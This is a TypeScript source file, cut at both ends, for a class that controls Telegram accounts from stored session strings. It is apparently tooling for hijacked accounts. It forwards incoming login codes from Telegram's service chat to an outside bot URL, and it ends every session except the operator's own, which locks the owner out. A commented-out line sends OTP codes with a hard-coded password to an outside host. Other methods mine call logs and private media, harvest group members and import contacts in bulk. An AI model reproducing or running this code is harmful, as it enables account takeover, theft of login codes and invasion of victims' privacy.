LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { EntityLike } from 'telegram/define';\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n\n        // Logic to categorize the dialog to a folder\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        // Add users to the channel\n        const usersToAdd = [\"fuckyoubabie\"]; // Replace with the list of usernames or user IDs\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        return { id, accessHash };\n    }\n\n    public async createGroupAndForward(fromChatId: string) {\n        const { id, accessHash } = await this.createGroup();\n        await this.forwardSecretMsgs(fromChatId, id.toString());\n    }\n\n    public async joinChannelAndForward(fromChatId: string, channel: string) {\n        const result: any = await this.joinChannel(channel);\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: result.chats[0].id,\n                            accessHash: result.chats[0].accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        await this.forwardSecretMsgs(fromChatId, channel);\n    }\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        let limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n\n        await this.leaveChannels([toChatId]);\n        return;\n    }\n\n    //logic to forward messages from a chat to another chat maintaining rate limits\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                const result = await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async disconnect(): Promise<void> {\n        if (this.client) {\n            console.log(\"Destroying Client: \", this.phoneNumber)\n            // await this.client.destroy();\n            this.client._destroyed = true\n            await this.client.disconnect();\n            this.client = null;\n        }\n        this.session.delete();\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        parseError(error)\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            // await this.client.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\n            // Handle other types of errors\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: Function): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 5,\n        });\n        this.client.setLogLevel(LogLevel.ERROR);\n        this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats\n    }\n\n    async getLastMsgs(limit: number): Promise<string> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const msgs = await this.client.getMessages(\"777000\", { limit });\n        let resp = '';\n        msgs.forEach((msg) => {\n            console.log(msg.text);\n            resp += msg.text + \"\\n\";\n        });\n        return resp;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (let id of chats) {\n            try {\n                const joinResult = await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: id\n                    })\n                );\n                console.log(\"Left channel :\", id)\n                if (chats.length > 1) {\n                    await sleep(30000);\n                }\n            } catch (error) {\n                const errorDetails = parseError(error);\n                console.log(\"Failed to leave channel :\", errorDetails.message)\n            }\n        }\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: any): boolean {\n        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||\n            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||\n            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||\n            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||\n            auth.appName.toLowerCase().includes(\"hanslnz\") || auth.deviceModel.toLowerCase().includes('windows');\n    }\n\n\n    private async resetAuthorization(auth: any): Promise<void> {\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(chatId: string) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory({\n                justClear: false,\n                peer: chatId,\n                revoke: false,\n            }));\n            console.log(`Dialog with ID ${chatId} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    // Helper function to handle download with a timeout\n    downloadWithTimeout(promise: Promise<Buffer>, timeout: number) {\n        return Promise.race([\n            promise, // The actual download promise\n            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))\n        ]);\n    }\n\n    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {\n        try {\n            const query = { limit: parseInt(limit.toString()) };\n            if (offset) query['offsetId'] = parseInt(offset.toString());\n\n            const messages = await this.client.getMessages(chatId, query);\n            const mediaMessages = messages.filter(message => {\n                // console.log(message.media?.className)\n                return (message.media && message.media.className !== \"MessageMediaWebPage\")\n            });\n            console.log(\"Total:\", messages.total, \"fetched: \", messages.length, \"ChatId: \", chatId, \"Media :\", mediaMessages.length);\n\n            if (!messages.length) {\n                // If no media messages are returned, we might have reached the end\n                console.log(\"No more media messages found. Reached the end of the chat.\");\n                return { data: [], endOfMessages: true };\n            }\n\n            const data = [];\n\n            for (const message of mediaMessages) {\n                console.log(message.media.className, message.document?.mimeType);\n                let thumbBuffer = null;\n\n                try {\n                    if (message.media instanceof Api.MessageMediaPhoto) {\n                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n                        console.log(\"messageId image:\", message.id)\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'photo',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n\n                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                        const sizes = message.document?.thumbs || [1];\n                        console.log(\"messageId video:\", message.id)\n                        // const fileSize = message.document.size;\n\n                        // // Skip overly large files for thumbnail (set threshold as needed)\n                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails\n                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);\n                        //     continue;\n                        // }\n\n                        // Call downloadWithTimeout with a 5-second timeout\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'video',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n                    }\n                } catch (downloadError) {\n                    if (downloadError.message === 'Download timeout') {\n                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);\n                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {\n                        console.warn('File reference expired for message. Skipping this media.');\n                        // Skip the expired media, continue processing others\n                    } else {\n                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);\n                    }\n                    data.push({\n                        messageId: message.id,\n                        mediaType: 'photo',\n                        thumb: null, // Convert to base64 for sending over HTTP, handle null\n                    });\n\n                    // Skip the message and continue with the next one if there's any error\n                    continue;\n                }\n            }\n            if (!data.length) {\n                data.push({\n                    messageId: messages[messages.length - 1].id,\n                    mediaType: 'photo',\n                    thumb: null, // Convert to base64 for sending over HTTP, handle null\n                })\n            }\n            console.log(\"Returning \", data.length);\n\n            // Return the metadata and signal if we reached the end of messages\n            return { data, endOfMessages: false };\n\n        } catch (error) {\n            console.error('Error in getMediaMetadata:', error);\n            if (error.message.includes('FLOOD_WAIT')) {\n                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\\d+)/)[1], 10);\n                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);\n                // Handle flood wait, retry logic\n                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));\n                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting\n            }\n\n            throw new Error('Error fetching media metadata');\n        }\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const messages = await this.client.getMessages(chatId, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || <Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    